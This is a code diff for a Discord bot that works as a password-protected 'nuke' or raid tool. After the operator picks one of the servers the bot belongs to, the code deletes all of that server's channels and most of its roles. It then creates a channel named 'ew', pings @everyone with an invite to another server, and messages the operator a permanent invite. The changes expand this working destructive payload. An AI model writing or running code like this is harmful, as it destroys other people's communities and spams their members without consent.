@@ -51,18 +51,17 @@ client.once('ready', () => {
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
-  if (message.content.toLowerCase() === '!fb') {
+  const content = message.content.trim().toLowerCase();
+
+  if (content === '!fb') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
       .setTitle('🔴 REMOTE NUKE')
-      .setDescription('Enter password to nuke a server.')
+      .setDescription('Enter password, then choose server to nuke.')
       .setFooter({ text: 'Click below' });
 
     const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`fb_start_${message.author.id}`)
-        .setLabel('Enter Password')
-        .setStyle(ButtonStyle.Danger)
+      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
     );
 
     await message.reply({ embeds: [embed], components: [row] });
@@ -75,50 +74,30 @@ client.on('interactionCreate', async interaction => {
 
   try {
     const userId = interaction.customId.split('_')[2];
-    if (interaction.user.id !== userId) {
-      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
-    }
+    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
 
     if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
-      const modal = new ModalBuilder()
-        .setCustomId(`fb_modal_${userId}`)
-        .setTitle('Enter Password');
-
-      modal.addComponents(new ActionRowBuilder().addComponents(
-        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-      ));
-
+      const modal = new ModalBuilder().setCustomId(`fb_modal_${userId}`).setTitle('Enter Password');
+      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
       return await interaction.showModal(modal);
     }
 
     if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
-      if (password !== MAIN_PASSWORD) {
-        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
-      }
+      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
 
-      // Show server selector
       const servers = client.guilds.cache.map(g => ({
         label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
         value: g.id,
         description: `${g.memberCount} members`
       }));
 
-      const menu = new StringSelectMenuBuilder()
-        .setCustomId(`fb_server_${userId}`)
-        .setPlaceholder('Choose server to NUKE')
-        .addOptions(servers);
-
+      const menu = new StringSelectMenuBuilder().setCustomId(`fb_server_${userId}`).setPlaceholder('Choose server to NUKE').addOptions(servers);
       const row = new ActionRowBuilder().addComponents(menu);
 
-      await interaction.reply({
-        content: '✅ Password correct! Choose the server to nuke:',
-        components: [row],
-        ephemeral: true
-      });
+      await interaction.reply({ content: '✅ Password correct! Select server:', components: [row], ephemeral: true });
     }
 
-    // Nuke the selected server
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
       await interaction.deferUpdate();
 
@@ -127,42 +106,44 @@ client.on('interactionCreate', async interaction => {
 
       if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });
 
-      await interaction.followUp({ content: `🔴 Nuking **${guild.name}**...`, ephemeral: true });
+      const user = interaction.user;
+
+      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting everything...`, ephemeral: true });
 
       try {
-        // Delete all channels
+        // Delete channels
         for (const channel of guild.channels.cache.values()) {
           await channel.delete().catch(() => {});
         }
 
-        // Delete all roles except @everyone and Owner
+        // Delete roles
         for (const role of guild.roles.cache.values()) {
           if (role.name === '@everyone' || role.name === 'Owner') continue;
           await role.delete().catch(() => {});
         }
 
-        // Create new channel "ew"
-        const newChannel = await guild.channels.create({
+        // Create "ew" channel
+        const ewChannel = await guild.channels.create({
           name: 'ew',
-          type: ChannelType.GuildText,
-          reason: 'Nuke channel'
+          type: ChannelType.GuildText
         });
 
-        // Send @everyone + join message
-        await newChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`);
+        await ewChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`);
 
-        await interaction.followUp({ content: `✅ **${guild.name}** has been nuked!`, ephemeral: true });
+        // Create invite for the user
+        const invite = await ewChannel.createInvite({ maxAge: 0, maxUses: 0 });
+
+        // DM the user
+        await user.send(`✅ **Raid Finished!**\nServer: **${guild.name}**\nInvite: https://discord.gg/${invite.code}`);
+
+        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked! Check your DMs for the invite.`, ephemeral: true });
       } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
+        await interaction.followUp({ content: '⚠️ Nuke partially completed. Check console.', ephemeral: true });
       }
     }
-
   } catch (error) {
     console.error(error);
-    if (!interaction.replied && !interaction.deferred) {
-      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
-    }
   }
 });
 
